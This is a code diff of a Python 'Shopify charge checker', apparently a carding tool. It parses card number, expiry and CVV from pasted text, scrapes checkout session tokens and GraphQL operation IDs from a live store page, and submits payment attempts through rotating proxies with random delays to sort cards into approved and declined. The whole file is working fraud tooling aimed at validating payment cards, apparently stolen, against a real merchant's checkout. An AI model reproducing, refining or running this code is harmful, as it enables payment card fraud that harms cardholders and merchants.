@@ -534,50 +534,6 @@ def intelligent_card_parse(text):
                 yy = yy[-2:]
             return cc, mm, yy, cvv
         
-        comma_pattern = r'(\d{13,19})\s*[,]\s*(\d{1,2})\s*[,]\s*(\d{2,4})\s*[,]\s*(\d{3,4})'
-        comma_match = re.search(comma_pattern, ascii_text)
-        if comma_match:
-            cc = comma_match.group(1)
-            mm = comma_match.group(2).zfill(2)
-            yy = comma_match.group(3)
-            cvv = comma_match.group(4)
-            if len(yy) == 4:
-                yy = yy[-2:]
-            return cc, mm, yy, cvv
-        
-        slash_pattern = r'(\d{13,19})\s*[/]\s*(\d{1,2})\s*[/]\s*(\d{2,4})\s*[/]\s*(\d{3,4})'
-        slash_match = re.search(slash_pattern, ascii_text)
-        if slash_match:
-            cc = slash_match.group(1)
-            mm = slash_match.group(2).zfill(2)
-            yy = slash_match.group(3)
-            cvv = slash_match.group(4)
-            if len(yy) == 4:
-                yy = yy[-2:]
-            return cc, mm, yy, cvv
-        
-        common_pattern = r'(\d{13,19})\s+(\d{1,2})[/\-](\d{2,4})\s+(\d{3,4})'
-        common_match = re.search(common_pattern, ascii_text)
-        if common_match:
-            cc = common_match.group(1)
-            mm = common_match.group(2).zfill(2)
-            yy = common_match.group(3)
-            cvv = common_match.group(4)
-            if len(yy) == 4:
-                yy = yy[-2:]
-            return cc, mm, yy, cvv
-        
-        card_label_pattern = r'(?:card|cc|c[ck])\s*[:：=]\s*(\d{13,19})[\s\|:,]+(\d{1,2})[\s\|:,]+(\d{2,4})[\s\|:,]+(\d{3,4})'
-        card_label_match = re.search(card_label_pattern, ascii_text, re.IGNORECASE)
-        if card_label_match:
-            cc = card_label_match.group(1)
-            mm = card_label_match.group(2).zfill(2)
-            yy = card_label_match.group(3)
-            cvv = card_label_match.group(4)
-            if len(yy) == 4:
-                yy = yy[-2:]
-            return cc, mm, yy, cvv
-        
         cc, mm, yy, cvv = extract_cc_from_ascii(ascii_text)
         if cc:
             return cc, mm, yy, cvv
@@ -632,14 +588,12 @@ class ShopifyHTTPCheckout:
         self.variant_id = "43207284392098"
         self.product_id = "7890988171426"
 
-        # These will be dynamically extracted from the checkout page
-        self.proposal_id = None
-        self.submit_id = None
-        self.poll_id = None
-        self.pickup_countries_id = None
+        # Dynamic IDs - with fallbacks from captured data
+        self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
+        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
+        self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
         self.delivery_strategy_handle = None
-        self.shopify_payments_identifier = None
-        self.checkout_profile_id = None
+        self.shopify_payments_identifier = "ca4f484d341716df9c8b4c59632eb0e7"
         
         self.proposal_queue_token = None
         self.payment_method_identifier = None
@@ -724,9 +678,6 @@ class ShopifyHTTPCheckout:
             (r'"x-checkout-one-session-token"[:\s]+"([A-Za-z0-9_-]{100,})"', "JSON property"),
             (r'sessionToken["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{100,}\.[A-Za-z0-9_-]{100,})["\']', "Session token JWT"),
             (r'"sessionToken"[:\s]+"([A-Za-z0-9_-]{100,}\.[A-Za-z0-9_-]{100,})"', "SessionToken JSON"),
-            (r'window\.__INITIAL_STATE__.*?"sessionToken"[:\s]+"([^"]{100,})"', "Initial state"),
-            (r'window\.__DATA__.*?"sessionToken"[:\s]+"([^"]{100,})"', "Window data"),
-            (r'"checkout-one".*?"token"[:\s]+"([^"]{100,})"', "Checkout one token"),
         ]
 
         for pattern, source in patterns:
@@ -735,122 +686,36 @@ class ShopifyHTTPCheckout:
                 candidate = match.group(1)
                 if len(candidate) > 100 and '.' in candidate:
                     session_token = candidate
-                    self.logger.data_extracted("Session Token (Aggressive)", session_token[:50] + "...", source)
-                    return session_token
-
-        jwt_patterns = [
-            r'[A-Za-z0-9_-]{100,200}\.[A-Za-z0-9_-]{100,200}\.[A-Za-z0-9_-]{40,100}',
-            r'["\']([A-Za-z0-9_-]{150,300}\.[A-Za-z0-9_-]{50,150})["\']',
-        ]
-
-        for pattern in jwt_patterns:
-            matches = re.findall(pattern, html_content)
-            for match in matches:
-                if len(match) > 150 and '.' in match and 'checkout' in html_content.lower():
-                    session_token = match
-                    self.logger.data_extracted("Session Token (JWT Search)", session_token[:50] + "...", "Regex pattern")
+                    self.logger.data_extracted("Session Token", session_token[:50] + "...", source)
                     return session_token
 
         return None
 
     def extract_dynamic_ids_from_page(self, html_content):
-        """
-        Dynamically extract all required GraphQL operation IDs and configuration
-        from the checkout page HTML. This ensures we always use the latest IDs.
-        """
-        extracted = {}
-        
-        # Extract all operationName + id pairs from persisted query URLs in the page
-        # Pattern matches: operationName=XXX&id=YYY or "operationName":"XXX"..."id":"YYY"
-        
-        # Method 1: Find in script tags / JSON blobs
-        # Look for persisted query references with operationName and id
-        persisted_patterns = [
-            # Pattern for URL-encoded params
-            r'operationName[=%]([A-Za-z]+)[^&]*[&%]id[=%]([a-f0-9]{64})',
-            # Pattern for JSON format
-            r'"operationName"\s*:\s*"([A-Za-z]+)"[^}]*"id"\s*:\s*"([a-f0-9]{64})"',
-            # Pattern for persisted query path
-            r'/persisted\?operationName=([A-Za-z]+)[^&]*&id=([a-f0-9]{64})',
-        ]
-        
+        """Dynamically extract GraphQL operation IDs from checkout page"""
         found_operations = {}
-        for pattern in persisted_patterns:
-            matches = re.findall(pattern, html_content, re.IGNORECASE)
-            for op_name, op_id in matches:
-                if len(op_id) == 64:  # Valid SHA256 hash
-                    found_operations[op_name] = op_id
         
-        # Method 2: Extract from __INITIAL_STATE__ or window.__DATA__
-        data_patterns = [
-            r'window\.__INITIAL_STATE__\s*=\s*({.+?});\s*\n',
-            r'window\.__DATA__\s*=\s*({.+?});',
-        ]
-        
-        for data_pattern in data_patterns:
-            data_match = re.search(data_pattern, html_content, re.DOTALL)
-            if data_match:
-                try:
-                    data = json.loads(data_match.group(1))
-                    # Recursively search for operation IDs
-                    def find_ops(obj, path=""):
-                        if isinstance(obj, dict):
-                            if 'operationName' in obj and 'id' in obj:
-                                name = obj['operationName']
-                                oid = obj['id']
-                                if isinstance(oid, str) and len(oid) == 64:
-                                    found_operations[name] = oid
-                            for k, v in obj.items():
-                                find_ops(v, f"{path}.{k}")
-                        elif isinstance(obj, list):
-                            for i, item in enumerate(obj):
-                                find_ops(item, f"{path}[{i}]")
-                    find_ops(data)
-                except:
-                    pass
+        # Pattern for persisted query URLs in the page
+        persisted_pattern = r'/persisted\?operationName=([A-Za-z]+)[^&]*&id=([a-f0-9]{64})'
+        matches = re.findall(persisted_pattern, html_content, re.IGNORECASE)
+        for op_name, op_id in matches:
+            if len(op_id) == 64:
+                found_operations[op_name] = op_id
         
         self.logger.data_extracted("Dynamic IDs Found", json.dumps(found_operations)[:300] if found_operations else "None", "Page HTML")
 
-        # Map operation names to our attributes
         op_mapping = {
             'Proposal': 'proposal_id',
             'SubmitForCompletion': 'submit_id',
             'PollForReceipt': 'poll_id',
-            'PickupCountries': 'pickup_countries_id',
         }
         
         for op_name, attr_name in op_mapping.items():
             if op_name in found_operations:
                 setattr(self, attr_name, found_operations[op_name])
                 self.logger.data_extracted(f"{op_name} ID (Dynamic)", found_operations[op_name][:20] + "...", "Page HTML")
+                self.logger.success_log(f"Using dynamic {op_name} ID: {found_operations[op_name][:20]}...")
         
-        # Also extract delivery strategy handle
-        delivery_patterns = [
-            r'"handle":"([a-f0-9]+-be73b24eea304774d3c2df281c6988e5)"',
-            r'"handle":"([a-f0-9]{32}-[a-f0-9]{32})"',
-            r'deliveryStrategyByHandle.*?"handle":"([a-f0-9-]+)"',
-        ]
-        for dp in delivery_patterns:
-            match = re.search(dp, html_content)
-            if match and len(match.group(1)) > 30:
-                self.delivery_strategy_handle = match.group(1)
-                self.logger.data_extracted("Delivery Strategy (Dynamic)", self.delivery_strategy_handle[:30] + "...", "Page HTML")
-                break
-        
-        # Extract shopify payments identifier from available payment methods
-        payments_pattern = r'"name":"shopify_payments"[^}]*"paymentMethodIdentifier":"([a-f0-9]+)"'
-        payments_match = re.search(payments_pattern, html_content)
-        if payments_match:
-            self.shopify_payments_identifier = payments_match.group(1)
-            self.logger.data_extracted("Shopify Payments ID (Dynamic)", self.shopify_payments_identifier[:20] + "...", "Page HTML")
-        
-        # Extract checkoutProfileId from the page
-        profile_pattern = r'"checkoutProfileId"\s*:\s*"([^"]+)"'
-        profile_match = re.search(profile_pattern, html_content)
-        if profile_match:
-            self.checkout_profile_id = profile_match.group(1)
-            self.logger.data_extracted("Checkout Profile ID (Dynamic)", self.checkout_profile_id[:30] + "...", "Page HTML")
-
         return found_operations
 
     def extract_delivery_strategy(self, html_content):
@@ -870,8 +735,8 @@ class ShopifyHTTPCheckout:
         except:
             return None
 
-    async def add_to_cart_and_get_checkout(self, max_retries=3):
-        """ORIGINAL WORKING FLOW - with dynamic ID extraction"""
+    async def add_to_cart_and_get_checkout(self, max_retries=2):
+        """Add to cart and get checkout page"""
         for attempt in range(max_retries):
             try:
                 self.step(2 if attempt == 0 else 2 + attempt, "ADD TO CART", 
@@ -945,14 +810,6 @@ class ShopifyHTTPCheckout:
                             continue
                         return False, f"Failed to add to cart: {resp.status_code}"
 
-                    try:
-                        cart_data = resp.json()
-                        if 'items' in cart_data and len(cart_data['items']) > 0:
-                            self.cart_token = cart_data['items'][0].get('key', '').split(':')[0]
-                            self.logger.data_extracted("Cart Token", self.cart_token, "Add to cart response")
-                    except:
-                        pass
-
                 except Exception as e:
                     self.logger.error_log("CART_ADD_ERROR", str(e))
                     if attempt < max_retries - 1:
@@ -1020,30 +877,13 @@ class ShopifyHTTPCheckout:
                     self.logger.data_extracted("Final Session Token", self.session_token[:50] + "...", "Success")
                     self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
                     
-                    # DYNAMICALLY EXTRACT ALL IDs from the page
+                    # Try to extract dynamic IDs from page
                     self.extract_dynamic_ids_from_page(page_content)
                     
-                    # Fallback delivery strategy if not dynamically extracted
                     if not self.delivery_strategy_handle:
                         self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
                     if not self.delivery_strategy_handle:
                         self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
-
-                    # FALLBACKS if dynamic extraction failed
-                    if not self.proposal_id:
-                        self.proposal_id = "e65ffeb18d0b5e7cc746231c07befb63f4bc2e69c060d4067ca9115a923ae427"
-                        self.logger.data_extracted("Proposal ID (Fallback)", self.proposal_id[:20] + "...", "Hardcoded from captured data")
-                    
-                    if not self.submit_id:
-                        self.submit_id = "7cc51969cc21c5f45bc518e0650abe94c2ff3ffa378fb7d0b72212b44ff36470"
-                        self.logger.data_extracted("Submit ID (Fallback)", self.submit_id[:20] + "...", "Hardcoded from captured data")
-                    
-                    if not self.poll_id:
-                        self.poll_id = "42b5051ef09da17cd5cb5789121ab3adab0ca8c9ec7547a4d431bb17060e757f"
-                        self.logger.data_extracted("Poll ID (Fallback)", self.poll_id[:20] + "...", "Hardcoded from captured data")
-                    
-                    if not self.shopify_payments_identifier:
-                        self.shopify_payments_identifier = "ca4f484d341716df9c8b4c59632eb0e7"
 
                     return True, page_content
 
@@ -1083,9 +923,11 @@ class ShopifyHTTPCheckout:
         return False, error_msg
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Execute checkout with dynamic IDs"""
+        """Execute checkout"""
         proxy_attempts = 0
         max_attempts = 3
+        
+        credit_card_bin = cc[:8]
         
         while proxy_attempts < max_attempts:
             proxy_attempts += 1
@@ -1206,8 +1048,8 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(2, 3)
 
-                # ============ PROPOSAL STEP - WITH DYNAMIC ID ============
-                self.step(4, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", f"Proposal ID: {self.proposal_id[:20]}...")
+                # ============ PROPOSAL STEP ============
+                self.step(4, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", f"ID: {self.proposal_id[:20]}...")
 
                 graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
@@ -1307,7 +1149,8 @@ class ShopifyHTTPCheckout:
                                 "zoneCode": "PA",
                                 "phone": ""
                             }
-                        }
+                        },
+                        "creditCardBin": credit_card_bin
                     },
                     "buyerIdentity": {
                         "customer": {
@@ -1315,9 +1158,11 @@ class ShopifyHTTPCheckout:
                             "countryCode": "US"
                         },
                         "email": self.email,
-                        "emailChanged": False,
+                        "emailChanged": True,
                         "phoneCountryCode": "US",
-                        "marketingConsent": [],
+                        "marketingConsent": [
+                            {"email": {"consentState": "DECLINED", "value": self.email}}
+                        ],
                         "shopPayOptInPhone": {
                             "countryCode": "US"
                         },
@@ -1356,7 +1201,8 @@ class ShopifyHTTPCheckout:
                     "optionalDuties": {
                         "buyerRefusesDuties": False
                     },
-                    "cartMetafields": []
+                    "cartMetafields": [],
+                    "includeTaxStrategyLines": False
                 }
 
                 proposal_headers = {
@@ -1376,7 +1222,7 @@ class ShopifyHTTPCheckout:
                     'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                     'x-checkout-one-session-token': self.session_token,
-                    'x-checkout-web-build-id': '0e1aa4a2d0226841954371a4b7b45388eaac3ef4',
+                    'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
                     'x-checkout-web-deploy-stage': 'production',
                     'x-checkout-web-server-handling': 'fast',
                     'x-checkout-web-server-rendering': 'yes',
@@ -1388,8 +1234,6 @@ class ShopifyHTTPCheckout:
                     "variables": proposal_variables,
                     "id": self.proposal_id
                 }
-
-                self.logger.data_extracted("Proposal Variables", json.dumps(proposal_variables, indent=2)[:200] + "...", "Constructed")
 
                 try:
                     resp = await self.client.post(
@@ -1409,36 +1253,28 @@ class ShopifyHTTPCheckout:
                     try:
                         proposal_resp = resp.json()
                         
-                        # DEBUG: Log response keys
                         resp_keys = list(proposal_resp.keys())
                         self.logger.data_extracted("PROPOSAL RESPONSE KEYS", str(resp_keys), "DEBUG")
                         
-                        # Check for GraphQL errors first
+                        # Check for GraphQL errors first (top-level errors = bad)
                         if 'errors' in proposal_resp and proposal_resp['errors']:
-                            error_msg = proposal_resp['errors'][0].get('message', 'Unknown error')
+                            error_msg = str(proposal_resp['errors'][0].get('message', 'Unknown error'))
                             self.logger.error_log("PROPOSAL_GRAPHQL_ERROR", error_msg[:200])
-                            # If the error is about outdated operation ID, we need to re-extract
-                            if "doesn't exist" in error_msg or "Unknown operation" in error_msg:
-                                self.logger.error_log("PROPOSAL_ID_OUTDATED", "The Proposal operation ID is outdated and needs to be updated from the page")
                             if proxy_attempts < max_attempts:
                                 await self.random_delay(1, 2)
                                 continue
                             return False, f"Proposal error: {error_msg[:50]}"
                         
-                        # Try to find result data
-                        result_data = None
+                        # Get negotiate result
                         negotiate = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {})
                         result_data = negotiate.get('result', {})
-                        
-                        if not result_data:
-                            result_data = negotiate
                         
                         if result_data:
                             self.proposal_queue_token = result_data.get('queueToken')
                             if self.proposal_queue_token:
                                 self.logger.data_extracted("Queue Token (from Proposal)", self.proposal_queue_token[:30] + "...", "Proposal Response")
                             
-                            # Extract paymentMethodIdentifier from seller proposal
+                            # Extract paymentMethodIdentifier
                             seller_proposal = result_data.get('sellerProposal', {})
                             payment_data = seller_proposal.get('payment', {})
                             available_lines = payment_data.get('availablePaymentLines', [])
@@ -1453,25 +1289,21 @@ class ShopifyHTTPCheckout:
                             if not self.payment_method_identifier:
                                 self.payment_method_identifier = self.shopify_payments_identifier
                         
-                        # Check for non-fatal errors
+                        # Check for negotiation errors (these are non-fatal, just warnings)
                         errors = negotiate.get('errors', []) if isinstance(negotiate, dict) else []
-                        fatal_errors = [e for e in errors if e.get('code') not in ['PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT']]
                         
-                        if fatal_errors:
-                            error_msg = fatal_errors[0].get('message', fatal_errors[0].get('localizedMessage', 'Unknown error'))
-                            if ":" in error_msg:
-                                error_msg = error_msg.split(":")[0].strip()
-                            self.logger.error_log("PROPOSAL_FATAL", f"Fatal proposal error: {error_msg}")
-                            if proxy_attempts < max_attempts:
-                                await self.random_delay(1, 2)
-                                continue
-                            return False, f"Proposal error: {error_msg[:50]}"
+                        # Log all errors for debugging
+                        if errors:
+                            error_codes = [e.get('code', 'UNKNOWN') for e in errors]
+                            self.logger.data_extracted("PROPOSAL ERRORS", json.dumps(error_codes), "Non-fatal warnings")
                         
+                        # FIX: All errors from negotiate.ERRORS are NON-FATAL if we got a queueToken
+                        # The real fatal errors come from top-level 'errors' key (checked above)
                         if self.proposal_queue_token:
-                            self.logger.success_log("Got queueToken from Proposal, proceeding to PCI step")
+                            self.logger.success_log("Got queueToken from Proposal - proceeding to PCI step")
                         else:
                             resp_str = json.dumps(proposal_resp)[:800]
-                            self.logger.error_log("PROPOSAL_NO_TOKEN", f"No queueToken found. Full response: {resp_str}")
+                            self.logger.error_log("PROPOSAL_NO_TOKEN", f"No queueToken found. Response: {resp_str}")
                             if proxy_attempts < max_attempts:
                                 await self.random_delay(1, 2)
                                 continue
@@ -1479,7 +1311,6 @@ class ShopifyHTTPCheckout:
                             
                     except json.JSONDecodeError as e:
                         self.logger.error_log("PROPOSAL_PARSE", f"JSON decode error: {str(e)}")
-                        self.logger.data_extracted("RAW RESPONSE TEXT", resp.text[:500], "ERROR")
                         if proxy_attempts < max_attempts:
                             await self.random_delay(1, 2)
                             continue
@@ -1566,7 +1397,6 @@ class ShopifyHTTPCheckout:
                     try:
                         pci_resp = resp.json()
                         payment_session_id = pci_resp.get('id')
-                        payment_method_identifier_pci = pci_resp.get('payment_method_identifier')
                         if not payment_session_id:
                             await pci_client.aclose()
                             if proxy_attempts < max_attempts:
@@ -1602,9 +1432,8 @@ class ShopifyHTTPCheckout:
                 self.step(6, "SUBMIT PAYMENT", "Submitting payment for processing with proxy", f"Submit ID: {self.submit_id[:20]}...")
 
                 attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
-
                 submit_queue_token = self.proposal_queue_token
-                submit_payment_method_identifier = self.payment_method_identifier or payment_method_identifier_pci or self.shopify_payments_identifier
+                submit_payment_method_identifier = self.payment_method_identifier or self.shopify_payments_identifier
 
                 submit_variables = {
                     "input": {
@@ -1743,7 +1572,8 @@ class ShopifyHTTPCheckout:
                                     "zoneCode": "PA",
                                     "phone": ""
                                 }
-                            }
+                            },
+                            "creditCardBin": credit_card_bin
                         },
                         "buyerIdentity": {
                             "customer": {
@@ -1753,7 +1583,9 @@ class ShopifyHTTPCheckout:
                             "email": self.email,
                             "emailChanged": False,
                             "phoneCountryCode": "US",
-                            "marketingConsent": [],
+                            "marketingConsent": [
+                                {"email": {"consentState": "DECLINED", "value": self.email}}
+                            ],
                             "shopPayOptInPhone": {
                                 "countryCode": "US"
                             },
@@ -1799,7 +1631,8 @@ class ShopifyHTTPCheckout:
                     "analytics": {
                         "requestUrl": f"https://meta-app-prod-store-1.myshopify.com/checkouts/cn/{self.checkout_token}/en-us/?_r={self.generate_random_string(32)}",
                         "pageId": f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(4)}-{self.generate_random_string(12)}"
-                    }
+                    },
+                    "includeTaxStrategyLines": False
                 }
 
                 submit_payload = {
@@ -1807,8 +1640,6 @@ class ShopifyHTTPCheckout:
                     "variables": submit_variables,
                     "id": self.submit_id
                 }
-
-                self.logger.data_extracted("Submit Variables", json.dumps(submit_variables, indent=2)[:200] + "...", "Constructed")
 
                 try:
                     resp = await self.client.post(
@@ -1850,11 +1681,8 @@ class ShopifyHTTPCheckout:
 
                         if receipt.get('__typename') == 'ProcessingReceipt':
                             poll_delay = receipt.get('pollDelay', 500) / 1000
-
                             self.step(7, "POLL RECEIPT", f"Waiting {poll_delay}s then polling for result")
-
                             await asyncio.sleep(poll_delay)
-
                             return await self.poll_receipt(proposal_headers)
                         else:
                             if proxy_attempts < max_attempts:
@@ -1888,24 +1716,12 @@ class ShopifyHTTPCheckout:
 
             except httpx.RequestError as e:
                 self.logger.error_log("NETWORK", f"Network error: {str(e)}")
-                error_str = str(e).lower()
-                if "connection error" in error_str or "pci error" in error_str:
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
                 if proxy_attempts < max_attempts:
                     await self.random_delay(1, 2)
                     continue
                 return False, f"Network error: {str(e)[:50]}"
             except Exception as e:
                 self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
-                error_str = str(e).lower()
-                if "connection error" in error_str or "pci error" in error_str:
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
                 if proxy_attempts < max_attempts:
                     await self.random_delay(1, 2)
                     continue
@@ -1917,7 +1733,7 @@ class ShopifyHTTPCheckout:
         return False, "PROXY_DEAD - All proxy attempts failed"
 
     async def poll_receipt(self, headers):
-        """Poll for receipt status with dynamic poll ID"""
+        """Poll for receipt status"""
         try:
             graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
@@ -1961,9 +1777,6 @@ class ShopifyHTTPCheckout:
                         return False, f"DECLINED - {error_code}"
 
                     elif receipt_type == 'ProcessedReceipt':
-                        purchase_order = receipt_data.get('purchaseOrder', {})
-                        if purchase_order:
-                            return True, "ORDER_PLACED"
                         return True, "ORDER_PLACED"
 
                     elif receipt_type == 'ProcessingReceipt':
@@ -2006,8 +1819,7 @@ class ShopifyChargeCheckerHTTP:
             
             if not cc or not mes or not ano or not cvv:
                 elapsed_time = time.time() - start_time
-                self.logger.error_log("INVALID_FORMAT", f"Could not parse card from: {card_details[:100]}...")
-                return format_shopify_response("", "", "", "", "Invalid card format - could not extract CC details", elapsed_time, username, user_data, self.proxy_status)
+                return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)
 
             if len(cc) < 15 or len(cc) > 19:
                 elapsed_time = time.time() - start_time
@@ -2049,10 +1861,7 @@ class ShopifyChargeCheckerHTTP:
                     cc = mes = ano = cvv = ""
             except:
                 cc = mes = ano = cvv = ""
-            error_msg = str(e)
-            if ":" in error_msg:
-                error_msg = error_msg.split(":")[0].strip()
-            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {error_msg[:30]}", elapsed_time, username, user_data, self.proxy_status)
+            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:30]}", elapsed_time, username, user_data, self.proxy_status)
 
 
 # ========== COMMAND HANDLER ==========
